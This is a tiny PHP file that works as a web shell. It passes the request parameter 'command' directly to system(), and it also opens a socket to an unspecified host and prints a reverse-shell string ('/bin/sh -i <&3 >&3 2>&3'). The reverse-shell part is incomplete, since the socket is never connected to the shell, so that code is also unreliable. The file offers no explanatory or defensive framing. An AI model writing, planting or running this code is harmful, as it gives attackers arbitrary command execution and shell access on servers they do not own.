<?php
$socket = fsockopen($host, $port);
$example = '/bin/sh -i <&3 >&3 2>&3';
$command = $_REQUEST['command'];
system($command);
echo $example;
